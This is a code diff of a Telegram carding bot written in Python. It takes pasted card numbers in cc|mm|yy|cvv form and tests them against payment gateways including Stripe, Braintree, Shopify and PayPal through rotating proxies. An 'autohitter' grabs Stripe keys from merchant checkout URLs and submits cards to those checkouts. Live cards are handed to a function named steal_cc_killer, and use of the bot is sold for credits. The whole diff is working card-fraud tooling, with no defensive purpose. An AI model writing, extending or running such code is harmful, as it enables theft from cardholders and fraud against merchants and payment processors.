+        pending_autohit[user_id] = {"action": "remove", "gateway": gateway}
+        
+        remove_text = f"🗑️ <b>REMOVE {gateway.upper()} URL</b>\n\n"
+        remove_text += "Send the <b>number</b> of the URL to remove:\n\n"
+        for i, url in enumerate(urls, 1):
+            short_url = url[:50] + "..." if len(url) > 50 else url
+            remove_text += f"{i}. <code>{short_url}</code>\n"
+        remove_text += "\n<i>Send the number now or /cancel to abort.</i>"
+        
+        await callback_query.answer()
+        await callback_query.edit_message_text(
+            remove_text,
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data=f"hitter_{gateway}")]])
+        )
+    
+    elif data.startswith("hitter_run_"):
+        gateway = data.replace("hitter_run_", "")
+        urls = get_hitter_urls(gateway)
+        
+        if not urls:
+            await callback_query.answer("No URLs added! Add URLs first.")
+            return
+        
+        pending_autohit[user_id] = {"action": "run", "gateway": gateway, "urls": urls}
+        await callback_query.answer()
+        await callback_query.edit_message_text(
+            f"🚀 <b>RUN {gateway.upper()} AUTOHIT</b>\n\n"
+            f"📥 URLs Loaded: <b>{len(urls)}</b>\n\n"
+            f"Now send the card to auto-hit:\n<code>cc|mm|yy|cvv</code>\n\n"
+            f"<i>Send the card now or /cancel to abort.</i>",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data=f"hitter_{gateway}")]])
+        )
 
     elif data == "back_start":
         await callback_query.answer()
         await start_cmd(client, callback_query.message)
 
-@app.on_message(filters.command(["killer", "chk"]) & authorized_filter)
+def get_gate_function(gate_key: str, check_type: str):
+    """Returns the appropriate gate function based on gate key and check type."""
+    from gates import (
+        check_stripe, check_braintree_auth, check_razorpay, check_razorpay_charge,
+        check_shopify, check_shopify_auth, check_payu, check_amazon, 
+        check_autohitter, check_nmi, check_payflow,
+        check_vbv, check_paypal, check_paypal_avs, check_autowoo,
+        check_braintree_auth2, check_braintree_charge,
+        check_stripe_sk, check_stripe_nonsk, check_stripe_autowoo,
+        check_stripe_inbuilt, check_stripe_autohitter_url,
+        check_fastspring_auth, check_fastspring_charge,
+        check_killer_gate
+    )
+    
+    if check_type == "auth":
+        gate_map = {
+            "shopify": check_shopify_auth,
+            "paypal": check_paypal,
+            "razorpay": check_razorpay,
+            "stripe": check_stripe,
+            "braintree": check_braintree_auth,
+            "nmi": check_nmi,
+            "payflow": check_payflow,
+            "vbv": check_vbv,
+        }
+    else:  # charged
+        gate_map = {
+            "shopify": check_shopify,
+            "paypal": check_paypal_avs,
+            "razorpay": check_razorpay_charge,
+            "stripe": check_stripe_sk,
+            "braintree": check_braintree_charge,
+            "fastspring": check_fastspring_charge,
+        }
+    
+    return gate_map.get(gate_key, check_stripe)
+
+# ========== AUTOHITTER MESSAGE HANDLER ==========
+@app.on_message(filters.text & authorized_filter & ~filters.command(["chk", "mchk", "kl", "gen", "start", "help", "addsite", "addurl", "listsites", "setproxy", "addproxy", "viewproxy", "myproxy", "listproxy", "plans", "addcredit", "setvip", "cancel"]))
+async def handle_autohit_input(client, message):
+    user_id = message.from_user.id
+    
+    if user_id not in pending_autohit:
+        return  # Not expecting input from this user
+    
+    action_data = pending_autohit[user_id]
+    action = action_data["action"]
+    gateway = action_data["gateway"]
+    text = message.text.strip()
+    
+    if action == "add":
+        # User is adding a URL
+        pending_autohit.pop(user_id, None)
+        
+        import re
+        url_match = re.search(r'https?://[^\s]+', text)
+        if not url_match:
+            await message.reply("❌ <b>Invalid URL!</b>\n\nPlease provide a valid checkout URL starting with http:// or https://")
+            return
+        
+        url = url_match.group(0)
+        if add_hitter_url(gateway, url):
+            await message.reply(f"✅ <b>URL Added!</b>\n\n<code>{url}</code>\n\nAdded to {gateway.upper()} autohitter.")
+        else:
+            await message.reply(f"⚠️ <b>URL already exists!</b>\n\n<code>{url}</code>")
+    
+    elif action == "remove":
+        # User is removing by number
+        pending_autohit.pop(user_id, None)
+        
+        try:
+            index = int(text) - 1
+            urls = get_hitter_urls(gateway)
+            if 0 <= index < len(urls):
+                url_to_remove = urls[index]
+                if remove_hitter_url(gateway, url_to_remove):
+                    await message.reply(f"🗑️ <b>URL Removed!</b>\n\n<code>{url_to_remove}</code>")
+                else:
+                    await message.reply("❌ <b>Error removing URL!</b>")
+            else:
+                await message.reply(f"❌ <b>Invalid number!</b>\n\nPlease enter a number between 1 and {len(urls)}.")
+        except ValueError:
+            await message.reply("❌ <b>Invalid input!</b>\n\nPlease enter a number.")
+    
+    elif action == "run":
+        # User is sending card for autohit
+        pending_autohit.pop(user_id, None)
+        
+        cards = extract_cards(text)
+        if not cards:
+            await message.reply("❌ <b>Invalid card format!</b>\n\nPlease provide: <code>cc|mm|yy|cvv</code>")
+            return
+        
+        if not update_user_credits(user_id, -2):
+            await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 2 Credits\nType /start to check balance.")
+            return
+        
+        card = cards[0]
+        urls = action_data["urls"]
+        
+        status_msg = await message.reply(f"🚀 <b>Running {gateway.upper()} AUTOHIT...</b>\n\nURLs: {len(urls)} | Card: <code>{card[0][:6]}xxxxxx</code>")
+        
+        from hitter_engine import StripeHitter
+        from config import get_proxy
+        
+        best_result = None
+        for i, url in enumerate(urls):
+            try:
+                await status_msg.edit(f"🚀 <b>{gateway.upper()} AUTOHIT</b>\n\nTrying URL {i+1}/{len(urls)}...")
+                
+                proxy = get_proxy()
+                hitter = StripeHitter(proxy)
+                
+                if gateway == "stripe":
+                    keys = await hitter.grab_keys(url)
+                    if keys:
+                        result = await hitter.hit_checkout(card[0], card[1], card[2], card[3], keys['pk'], keys['cs'], keys.get('amount'), keys.get('currency', 'usd'), keys.get('email'))
+                        result['gate'] = f"Stripe Hitter ({url[:30]}...)"
+                    else:
+                        result = {"status": "error", "response": "Failed to extract keys", "gate": "Stripe Hitter"}
+                elif gateway == "braintree":
+                    # For Braintree, use braintree gate
+                    from gates import check_braintree_auth
+                    result = await check_braintree_auth(card[0], card[1], card[2], card[3], proxy)
+                    result['gate'] = f"Braintree Hitter"
+                else:
+                    result = {"status": "error", "response": "Unknown gateway", "gate": gateway}
+                
+                if result.get('status') in ["approved", "live", "success", "charged"]:
+                    best_result = result
+                    break  # Found a hit!
+                    
+            except Exception as e:
+                result = {"status": "error", "response": str(e), "gate": gateway}
+        
+        if not best_result:
+            best_result = result if result else {"status": "dead", "response": "All URLs failed", "gate": gateway}
+        
+        # Format result
+        bin_data = get_bin_info(card[0][:6])
+        cc_full = '|'.join(card)
+        extrap = f"{card[0][:12]}xxxx|{card[1]}|{card[2]}|xxx"
+        
+        final_text = f"""
+<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 🎯 AUTOHIT]</b>
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>Card >_</b> <code>{cc_full}</code>
+<b>$Status:</b> {best_result.get('status', 'N/A').upper()} ✨
+<b>Response >_</b> {best_result.get('response', 'N/A')}
+<b>$Extrap:</b> <code>{extrap}</code>
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>Bin info >_</b> <code>{card[0][:6]}</code> | <b>Country:</b> {bin_data['country']} | {bin_data['flag']}
+<b>$Info:</b> {bin_data['bank']} - {bin_data['type']} - {bin_data['level']}
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>Gate >_</b> {best_result.get('gate', gateway.upper())}
+<b>$URLs Tried:</b> {len(urls)}
+- ━━━━━━━━━━━━━━━━━━━━━━ -
+<b>#Developer >_</b> {DEVELOPER_NAME} ☀️
+        """
+        
+        await status_msg.edit(final_text)
+        
+        if best_result.get('status') in ["approved", "live", "success", "charged"]:
+            await steal_cc_killer(client, message, cc_full, best_result)
+
+@app.on_message(filters.command("cancel") & authorized_filter)
+async def cancel_autohit(client, message):
+    user_id = message.from_user.id
+    if user_id in pending_autohit:
+        pending_autohit.pop(user_id)
+        await message.reply("❌ <b>Operation cancelled.</b>")
+    else:
+        await message.reply("ℹ️ <b>Nothing to cancel.</b>")
+
+# ========== /chk - SINGLE CHECKER ==========
+@app.on_message(filters.command("chk") & authorized_filter)
 async def single_check(client, message):
-    # Anti-Flood
     is_flood, remain = check_flood(message.from_user.id, wait_time=5)
     if is_flood:
         return await message.reply(f"⏳ Wait {remain}s before next check.")
@@ -388,221 +930,29 @@ async def single_check(client, message):
     
     if not cards:
         return await message.reply("❌ <b>Provide card:</b> <code>/chk cc|mm|yy|cvv</code>")
-        
-    # CREDIT CHECK
-    if not update_user_credits(message.from_user.id, -1):
-        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 1 Credit\nType /start to check balance.")
     
-    status_msg = await message.reply("⚡ <b>Checking...</b>")
-    
-    start_time = time.perf_counter()
-    card = cards[0]
-    result = await run_all_gates(card)
-    end_time = time.perf_counter()
-    time_taken = f"{end_time - start_time:.2f}"
-    
-    # Unique Premium Format
-    bin_data = get_bin_info(card[0][:6])
-    cc_full = '|'.join(card)
-    extrap = f"{cc_full[:12]}xxxx|{card[1]}|{card[2]}|xxx"
-    
-    final_text = f"""
-<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 💀]</b>
-- ━━━━━━━━━━━━━━━━━━━━━━ -
-<b>Card >_</b> <code>{cc_full}</code>
-<b>$Status:</b> {result['status'].upper()} ✨
-<b>Response >_</b> {result['response']}
-<b>$Extrap:</b> <code>{extrap}</code>
-- ━━━━━━━━━━━━━━━━━━━━━━ -
-<b>Bin info >_</b> <code>{card[0][:6]}</code> | <b>Country:</b> {bin_data['country']} | {bin_data['flag']}
-<b>$Info:</b> {bin_data['bank']} - {bin_data['type']} - {bin_data['level']}
-- ━━━━━━━━━━━━━━━━━━━━━━ -
-<b>Gate >_</b> {result['gate']}
-<b>$Proxy:</b> [LIVE ✨!] | <b>Time:</b> [{time_taken} Seconds!]
-- ━━━━━━━━━━━━━━━━━━━━━━ -
-<b>#Developer >_</b> {DEVELOPER_NAME} ☀️
-    """
-    
-    await status_msg.edit(final_text)
-    
-    # Auto Forward live / charged
-    if result['status'] in ["approved", "live", "success", "charged"]:
-        await steal_cc_killer(client, message, '|'.join(card), result)
-
-@app.on_message(filters.command(["mstr", "mbtn", "mrzp", "mshp", "mpayu", "maz", "mhit", "mnmi", "mpayf", "mshpa", "mvbv", "mppal", "mppavs", "mas", "mbtnc", "mash", "msk", "mskc", "mnsk", "mnsk2", "mnsk3", "msaw", "msaw2", "msaw3", "micvv", "miccn", "mfs", "mfsc", "mck", "mbt", "mbt2", "mbtc"]) & authorized_filter)
-async def specific_mass_check(client, message):
-    # Mass gate check logic
-    cmd = message.command[0]
-    gate_cmd = cmd[1:] # strip 'm' prefix
-    
-    is_flood, remain = check_flood(message.from_user.id, wait_time=30)
-    if is_flood:
-        return await message.reply(f"⏳ Mass checks are limited. Wait {remain}s.")
-
-    text, error = await get_text_from_message(client, message)
-    if error: return await message.reply(error)
-    
-    cards = extract_cards(text)
-    
-    if not cards:
-        return await message.reply(f"❌ <b>No cards found.</b>\nUsage: <code>/{cmd} list_of_cards</code> or upload .txt")
-        
-    # CREDIT CHECK
-    if not update_user_credits(message.from_user.id, -5):
-        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 5 Credits")
-
-    status_msg = await message.reply(f"⚡ <b>Mass Checking via {gate_cmd.upper()}...</b>")
-    
-    # SPECIAL VALIDATION FOR SHOPIFY
-    if gate_cmd in ["shp", "shpa", "ash"]:
-        from config import get_proxy, load_sites
-        if not get_proxy():
-            return await status_msg.edit("❌ <b>Shopify requires a Proxy!</b>\nUse: <code>/setproxy http://user:pass@ip:port</code>")
-        if not load_sites():
-            return await status_msg.edit("❌ <b>Shopify requires a Site!</b>\nUse: <code>/addsite https://site.com</code>")
-
-    # RE-USE GATE MAP (Simply import from local scope or define helper to avoid duplication if preferred, but copy is safe here)
-    from gates import (
-        check_stripe, check_braintree_auth, check_razorpay, 
-        check_shopify, check_payu, check_amazon, 
-        check_autohitter, check_nmi, check_payflow,
-        check_shopify_auth, check_vbv, check_paypal, check_paypal_avs, check_autowoo,
-        check_braintree_auth2, check_braintree_charge,
-        check_stripe_sk, check_stripe_nonsk, check_stripe_autowoo,
-        check_stripe_inbuilt, check_stripe_autohitter_url,
-        check_fastspring_auth, check_fastspring_charge,
-        check_killer_gate
-    )
-    gate_map = {
-        "btn": check_braintree_auth,
-        "bt": check_braintree_auth,
-        "bt2": check_braintree_auth2,
-        "btnc": check_braintree_charge,
-        "btc": check_braintree_charge,
-        "rzp": check_razorpay,
-        "shp": check_shopify,
-        "payu": check_payu,
-        "az": check_amazon,
-        "hit": check_autohitter,
-        "nmi": check_nmi,
-        "payf": check_payflow,
-        "shpa": check_shopify_auth,
-        "vbv": check_vbv,
-        "ppal": check_paypal,
-        "ppavs": check_paypal_avs,
-        "as": check_autowoo,
-        "ash": check_shopify_auth,
-        "sk": check_stripe_sk,
-        "skc": lambda *args, **kwargs: check_stripe_sk(*args, ccn=True, **kwargs),
-        "nsk": lambda *args: check_stripe_nonsk(*args, api_version=1),
-        "nsk2": lambda *args: check_stripe_nonsk(*args, api_version=2),
-        "nsk3": lambda *args: check_stripe_nonsk(*args, api_version=3),
-        "saw": lambda *args: check_stripe_autowoo(*args, variation=1),
-        "saw2": lambda *args: check_stripe_autowoo(*args, variation=2),
-        "saw3": lambda *args: check_stripe_autowoo(*args, variation=3),
-        "icvv": check_stripe_inbuilt,
-        "iccn": lambda *args, **kwargs: check_stripe_inbuilt(*args, is_ccn=True, **kwargs),
-        "fs": check_fastspring_auth,
-        "fsc": check_fastspring_charge,
-        "ck": check_killer_gate,
-        "str": check_stripe # Added explicit str mapping if missing (it was in individual check via explicit import handling but map is safer)
+    # Store card temporarily
+    pending_checks[message.from_user.id] = {
+        "card": cards[0],
+        "message": message,
+        "type": None
     }
     
-    gate_func = gate_map.get(gate_cmd)
-    if not gate_func:
-         # Fallback for direct "str" or checks that might use default stripe logic if not in map
-         if gate_cmd == "str": gate_func = check_stripe
-         else: return await status_msg.edit("❌ <b>Gate Logic Not Found.</b>")
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔐 AUTH", callback_data="chk_auth")],
+        [InlineKeyboardButton("💰 CHARGED", callback_data="chk_charged")]
+    ])
+    
+    await message.reply(
+        f"📊 <b>Single Check - Select Type</b>\n\n"
+        f"💳 Card: <code>{cards[0][0][:6]}xxxxxx</code>\n\n"
+        f"Choose check type:",
+        reply_markup=keyboard
+    )
 
-    from api_killer import mass_specific_gate_runner
-    
-    total = len(cards)
-    async def update_status(checked, total):
-        if checked % 5 == 0 or checked == total:
-            try:
-                await status_msg.edit(f"⚡ <b>Mass {gate_cmd.upper()}...</b> \nProgress: <code>[{checked}/{total}]</code>")
-            except: pass
-
-    results = await mass_specific_gate_runner(cards, gate_func, status_callback=update_status)
-    
-    # Format Report
-    lives = [k for k, v in results.items() if v['status'] in ["approved", "live", "success", "charged"]]
-    
-    report = f"""
-💀 <b>MASS {gate_cmd.upper()} COMPLETE</b>
-━━━━━━━━━━━━━━━━━━━━━━━
-📊 Stats: <b>{len(lives)}/{total} LIVE/CHARGED</b>
-✅ Live List:
-"""
-    for card_cc in lives[:10]: 
-        report += f"• <code>{card_cc}</code>\n"
-    
-    if len(lives) > 10:
-        report += f"<i>...and {len(lives)-10} more</i>"
-        
-    await status_msg.edit(report)
-    
-    # Auto Forward
-    for card_cc in lives:
-        res = results[card_cc]
-        await steal_cc_killer(client, message, card_cc, res)
-
-@app.on_message(filters.command("mkiller") & authorized_filter)
-async def mass_killer_cmd(client, message):
-    """💀 Mass KILLER - Runs card through ALL gates aggressively"""
-    is_flood, remain = check_flood(message.from_user.id, wait_time=30)
-    if is_flood:
-        return await message.reply(f"⏳ Mass checks are limited. Wait {remain}s.")
-
-    text, error = await get_text_from_message(client, message)
-    if error: return await message.reply(error)
-
-    cards = extract_cards(text)
-    
-    if not cards:
-        return await message.reply("❌ <b>No cards found in text/file.</b>")
-        
-    # CREDIT CHECK - Killer costs more
-    if not update_user_credits(message.from_user.id, -10):
-        return await message.reply("⚠️ <b>Insufficient Credits for Killer!</b>\nNeed: 10 Credits\nType /start to check balance.")
-    
-    total = len(cards)
-    status_msg = await message.reply(f"💀 <b>KILLING {total} cards (ALL GATES)...</b>")
-    
-    async def update_status(checked, total):
-        if checked % 5 == 0 or checked == total:
-            try:
-                await status_msg.edit(f"💀 <b>KILLER Mode...</b> \nProgress: <code>[{checked}/{total}]</code>")
-            except: pass
-
-    results = await mass_killer(cards, status_callback=update_status)
-    
-    lives = [k for k, v in results.items() if v['status'] in ["approved", "live", "success", "charged"]]
-    
-    report = f"""
-💀 <b>MASS KILLER COMPLETE</b>
-━━━━━━━━━━━━━━━━━━━━━━━
-📊 Stats: <b>{len(lives)}/{total} LIVE/CHARGED</b>
-✅ Live List:
-"""
-    for card_cc in lives[:10]:
-        report += f"• <code>{card_cc}</code>\n"
-    
-    if len(lives) > 10:
-        report += f"<i>...and {len(lives)-10} more</i>"
-        
-    await status_msg.edit(report)
-    
-    for card_cc in lives:
-        res = results[card_cc]
-        await steal_cc_killer(client, message, card_cc, res)
-
-# Store pending mass check data per user
-pending_mass_checks = {}
-
+# ========== /mchk - MASS CHECKER ==========
 @app.on_message(filters.command("mchk") & authorized_filter)
 async def mass_check_cmd(client, message):
-    """📊 Mass CHECK - Regular single-gate check"""
     is_flood, remain = check_flood(message.from_user.id, wait_time=15)
     if is_flood:
         return await message.reply(f"⏳ Mass checks are limited. Wait {remain}s.")
@@ -613,43 +963,31 @@ async def mass_check_cmd(client, message):
     cards = extract_cards(text)
     
     if not cards:
-        return await message.reply("❌ <b>No cards found in text/file.</b>")
-        
-    # CREDIT CHECK - Regular check costs less
-    if not update_user_credits(message.from_user.id, -5):
-        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 5 Credits\nType /start to check balance.")
+        return await message.reply("❌ <b>No cards found in text/file.</b>\nUsage: <code>/mchk</code> + upload .txt or paste cards")
     
-    # Store cards temporarily for this user
+    # Store cards temporarily
     pending_mass_checks[message.from_user.id] = {
         "cards": cards,
-        "message": message
+        "message": message,
+        "type": None
     }
     
-    # Show gate selection menu - ONE BUTTON PER ROW for clean look
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("💳 Stripe", callback_data="mchk_str")],
-        [InlineKeyboardButton("🛒 Shopify", callback_data="mchk_shp")],
-        [InlineKeyboardButton("🧠 Braintree", callback_data="mchk_btn")],
-        [InlineKeyboardButton("💰 PayPal", callback_data="mchk_ppal")],
-        [InlineKeyboardButton("🔷 NMI", callback_data="mchk_nmi")],
-        [InlineKeyboardButton("⚡ PayFlow", callback_data="mchk_payf")],
-        [InlineKeyboardButton("🔐 VBV 3D", callback_data="mchk_vbv")],
-        [InlineKeyboardButton("🎯 Stripe Auth", callback_data="mchk_as")],
-        [InlineKeyboardButton("🔑 Stripe SK", callback_data="mchk_sk")],
-        [InlineKeyboardButton("🚀 FastSpring", callback_data="mchk_fs")],
-        [InlineKeyboardButton("💀 KILLER (All Gates)", callback_data="mchk_killer")]
+        [InlineKeyboardButton("🔐 AUTH", callback_data="mchk_auth")],
+        [InlineKeyboardButton("💰 CHARGED", callback_data="mchk_charged")]
     ])
     
     await message.reply(
-        f"📊 <b>Mass Check - Select Gate</b>\n\n"
+        f"📊 <b>Mass Check - Select Type</b>\n\n"
         f"📥 Cards loaded: <b>{len(cards)}</b>\n\n"
-        f"Choose which gate to use:",
+        f"Choose check type:",
         reply_markup=keyboard
     )
 
-@app.on_message(filters.command(["str", "btn", "rzp", "shp", "payu", "az", "hit", "nmi", "payf", "shpa", "vbv", "ppal", "ppavs", "as", "btnc", "ash", "sk", "skc", "nsk", "nsk2", "nsk3", "saw", "saw2", "saw3", "icvv", "iccn", "fs", "fsc", "ck", "bt", "bt2", "btc"]) & authorized_filter)
-async def individual_gate_check(client, message):
-    cmd = message.command[0]
+# ========== /kl - CC KILLER (SINGLE) ==========
+@app.on_message(filters.command("kl") & authorized_filter)
+async def single_killer_cmd(client, message):
+    """💀 Single CC Killer - Runs card through ALL gates aggressively"""
     is_flood, remain = check_flood(message.from_user.id, wait_time=5)
     if is_flood:
         return await message.reply(f"⏳ Wait {remain}s before next check.")
@@ -658,106 +996,35 @@ async def individual_gate_check(client, message):
     cards = extract_cards(text)
     
     if not cards:
-        return await message.reply(f"❌ <b>Provide card:</b> <code>/{cmd} cc|mm|yy|cvv</code>")
-        
-    # CREDIT CHECK
-    if not update_user_credits(message.from_user.id, -1):
-        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 1 Credit\nType /start to check balance.")
+        return await message.reply("❌ <b>Provide card:</b> <code>/kl cc|mm|yy|cvv</code>")
     
-    status_msg = await message.reply(f"⚡ <b>Checking via {cmd.upper()}...</b>")
-
-    # SPECIAL VALIDATION FOR SHOPIFY
-    if cmd in ["shp", "shpa", "ash"]:
-        from config import get_proxy, load_sites
-        if not get_proxy():
-            return await status_msg.edit("❌ <b>Shopify requires a Proxy!</b>\nUse: <code>/setproxy http://user:pass@ip:port</code>")
-        if not load_sites():
-            return await status_msg.edit("❌ <b>Shopify requires a Site!</b>\nUse: <code>/addsite https://site.com</code>")
+    if not update_user_credits(message.from_user.id, -2):
+        return await message.reply("⚠️ <b>Insufficient Credits!</b>\nNeed: 2 Credits\nType /start to check balance.")
     
-    # Map command to gate function
-    from gates import (
-        check_stripe, check_braintree_auth, check_razorpay, 
-        check_shopify, check_payu, check_amazon, 
-        check_autohitter, check_nmi, check_payflow,
-        check_shopify_auth, check_vbv, check_paypal, check_paypal_avs, check_autowoo,
-        check_braintree_auth2, check_braintree_charge,
-        check_stripe_sk, check_stripe_nonsk, check_stripe_autowoo,
-        check_stripe_inbuilt, check_stripe_autohitter_url,
-        check_fastspring_auth, check_fastspring_charge,
-        check_killer_gate
-    )
-    gate_map = {
-        "btn": check_braintree_auth,
-        "bt": check_braintree_auth,
-        "bt2": check_braintree_auth2,
-        "btnc": check_braintree_charge,
-        "btc": check_braintree_charge,
-        "rzp": check_razorpay,
-        "shp": check_shopify,
-        "payu": check_payu,
-        "az": check_amazon,
-        "hit": check_autohitter,
-        "nmi": check_nmi,
-        "payf": check_payflow,
-        "shpa": check_shopify_auth,
-        "vbv": check_vbv,
-        "ppal": check_paypal,
-        "ppavs": check_paypal_avs,
-        "as": check_autowoo,
-        "ash": check_shopify_auth,
-        "sk": check_stripe_sk,
-        "skc": lambda *args, **kwargs: check_stripe_sk(*args, ccn=True, **kwargs),
-        "nsk": lambda *args: check_stripe_nonsk(*args, api_version=1),
-        "nsk2": lambda *args: check_stripe_nonsk(*args, api_version=2),
-        "nsk3": lambda *args: check_stripe_nonsk(*args, api_version=3),
-        "saw": lambda *args: check_stripe_autowoo(*args, variation=1),
-        "saw2": lambda *args: check_stripe_autowoo(*args, variation=2),
-        "saw3": lambda *args: check_stripe_autowoo(*args, variation=3),
-        "icvv": check_stripe_inbuilt,
-        "iccn": lambda *args, **kwargs: check_stripe_inbuilt(*args, is_ccn=True, **kwargs),
-        "fs": check_fastspring_auth,
-        "fsc": check_fastspring_charge,
-        "ck": check_killer_gate
-    }
-    
-    gate_func = gate_map.get(cmd)
-    card = cards[0]
+    status_msg = await message.reply("💀 <b>KILLING... (All Gates)</b>")
     
     start_time = time.perf_counter()
     card = cards[0]
-    
-    # Special handling for /hit which needs a URL
-    if cmd == "hit":
-        import re
-        url_match = re.search(r'https?://[^\s]+', text)
-        if url_match:
-            checkout_url = url_match.group(0)
-            result = await check_stripe_autohitter_url(checkout_url, *card)
-        else:
-            result = await check_autohitter(*card)
-    else:
-        result = await gate_func(*card)
-    
+    result = await run_all_gates(card)
     end_time = time.perf_counter()
     time_taken = f"{end_time - start_time:.2f}"
     
-    # Unique Premium Format
     bin_data = get_bin_info(card[0][:6])
     cc_full = '|'.join(card)
-    extrap = f"{cc_full[:12]}xxxx|{card[1]}|{card[2]}|xxx"
+    extrap = f"{card[0][:12]}xxxx|{card[1]}|{card[2]}|xxx"
     
     final_text = f"""
-<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 💀]</b>
+<b>{PROJECT_TAG} 〉 [{PROJECT_NAME} 💀 KILLER]</b>
 - ━━━━━━━━━━━━━━━━━━━━━━ -
 <b>Card >_</b> <code>{cc_full}</code>
 <b>$Status:</b> {result['status'].upper()} ✨
-<b>Response >_</b> {result.get('response', 'N/A')}
+<b>Response >_</b> {result['response']}
 <b>$Extrap:</b> <code>{extrap}</code>
 - ━━━━━━━━━━━━━━━━━━━━━━ -
 <b>Bin info >_</b> <code>{card[0][:6]}</code> | <b>Country:</b> {bin_data['country']} | {bin_data['flag']}
 <b>$Info:</b> {bin_data['bank']} - {bin_data['type']} - {bin_data['level']}
 - ━━━━━━━━━━━━━━━━━━━━━━ -
-<b>Gate >_</b> {cmd.upper()}
+<b>Gate >_</b> {result.get('gate', 'KILLER')}
 <b>$Proxy:</b> [LIVE ✨!] | <b>Time:</b> [{time_taken} Seconds!]
 - ━━━━━━━━━━━━━━━━━━━━━━ -
 <b>#Developer >_</b> {DEVELOPER_NAME} ☀️
@@ -765,11 +1032,10 @@ async def individual_gate_check(client, message):
     
     await status_msg.edit(final_text)
     
-    if result.get('status') in ["approved", "live", "success", "charged"]:
-        result['card'] = card[0]
-        result['bin'] = card[0][:6]
-        await steal_cc_killer(client, message, '|'.join(card), result)
+    if result['status'] in ["approved", "live", "success", "charged"]:
+        await steal_cc_killer(client, message, cc_full, result)
 
+# ========== ADMIN COMMANDS ==========
 @app.on_message(filters.command("addcredit") & filters.user(OWNER_ID))
 async def add_credit_admin(client, message):
     if len(message.command) < 3:
@@ -797,6 +1063,7 @@ async def set_vip_admin(client, message):
     except Exception as e:
         await message.reply(f"❌ <b>Error:</b> {e}")
 
+# ========== UTILITY COMMANDS ==========
 @app.on_message(filters.command(["addsite", "addurl"]) & authorized_filter)
 async def add_site_cmd(client, message):
     text, error = await get_text_from_message(client, message)
@@ -805,9 +1072,7 @@ async def add_site_cmd(client, message):
     if not text:
         return await message.reply("❌ <b>Usage:</b> <code>/addsite https://example.com</code> or upload .txt")
     
-    # Support multiple sites separated by newline or comma
     import re
-    # Match domains too
     matches = re.findall(r'(?:https?://)?(?:[\w-]+\.)+[\w-]+(?:/[^\s,]*)?', text)
     
     if not matches:
@@ -817,7 +1082,7 @@ async def add_site_cmd(client, message):
     added = 0
     for url in matches:
         if not url.startswith("http"):
-            url = "https://" + url # Auto-Prepend Protocol
+            url = "https://" + url
         if save_site(url):
             added += 1
             
@@ -850,19 +1115,16 @@ async def set_proxy_cmd(client, message):
         line = line.strip()
         if not line: continue
         
-        # 1. Check if already HTTP format
         if line.startswith("http"):
             valid_proxies.append(line)
             continue
             
-        # 2. Parse host:port:user:pass or user:pass:host:port
         parts = line.split(":")
         if len(parts) == 4:
-            # Assume host:port:user:pass if first part looks like IP or domain
             if "." in parts[0]: 
                 host, port, user, pwd = parts
                 valid_proxies.append(f"http://{user}:{pwd}@{host}:{port}")
-            else: # assume user:pass:host:port (less common but possible)
+            else:
                 user, pwd, host, port = parts
                 valid_proxies.append(f"http://{user}:{pwd}@{host}:{port}")
         elif len(parts) == 2:
@@ -880,7 +1142,7 @@ async def set_proxy_cmd(client, message):
 @app.on_message(filters.command(["viewproxy", "myproxy", "listproxy"]) & authorized_filter)
 async def view_proxy_cmd(client, message):
     from config import PROXY_LIST, load_proxies
-    load_proxies()  # Refresh list
+    load_proxies()
     
     if not PROXY_LIST:
         return await message.reply("⚠️ <b>No Proxies Loaded.</b> (Using Direct Connection)")
@@ -888,9 +1150,7 @@ async def view_proxy_cmd(client, message):
     msg = f"🔒 <b>Loaded Proxies:</b> ({len(PROXY_LIST)} total)\n"
     msg += "━━━━━━━━━━━━━━━━━━━\n"
     
-    # Show first 10 proxies (truncate for readability)
     for i, proxy in enumerate(PROXY_LIST[:10], 1):
-        # Mask password for security
         masked = proxy[:30] + "..." if len(proxy) > 30 else proxy
         msg += f"{i}. <code>{masked}</code>\n"
     
@@ -900,45 +1160,9 @@ async def view_proxy_cmd(client, message):
     msg += "\n♻️ <i>Rotating automatically</i>"
     await message.reply(msg)
 
-@app.on_message(filters.command("listsites") & authorized_filter)
-async def list_sites_cmd(client, message):
-    from config import load_sites
-    sites = load_sites()
-    if not sites:
-        return await message.reply("📭 <b>No sites added yet.</b>")
-    
-    msg = "📂 <b>Added Sites:</b>\n"
-    for site in sites:
-        msg += f"• <code>{site}</code>\n"
-    await message.reply(msg)
-
-@app.on_message(filters.command(["queuestatus", "qstatus", "qs"]) & authorized_filter)
-async def queue_status_cmd(client, message):
-    from queue_manager import get_queue
-    queue = get_queue()
-    stats = queue.get_stats()
-    user_pending = queue.get_user_pending(message.from_user.id)
-    
-    status_text = f"""
-📊 <b>QUEUE STATUS</b>
-━━━━━━━━━━━━━━━━━━━━━━━
-📥 <b>Global Queue:</b> {stats['queue_size']} cards
-⚡ <b>Active Workers:</b> {stats['active_workers']}/{stats['max_workers']}
-✅ <b>Total Processed:</b> {stats['total_processed']}
-━━━━━━━━━━━━━━━━━━━━━━━
-👤 <b>Your Pending:</b> {user_pending} cards
-
-<i>VIP users get processed first!</i> 👑
-    """
-    await message.reply(status_text)
-
 @app.on_message(filters.command("plans") & authorized_filter)
 async def plans_command(client, message):
-    # Reuse show_plans logic
-    from pyrogram.types import CallbackQuery
-    # Create a dummy callback query to use the existing handler or just refactor
-    # Better: just copy the text and markup
-    plans_text = """
+    plans_text = f"""
 💎 <b>AVAILABLE PLANS:</b>
 ━━━━━━━━━━━━━━━━━━━━━━━
 🔰 <b>BASIC PLAN</b>
@@ -967,8 +1191,6 @@ async def plans_command(client, message):
 • QR Code: /start -> View Plans -> View QR
 
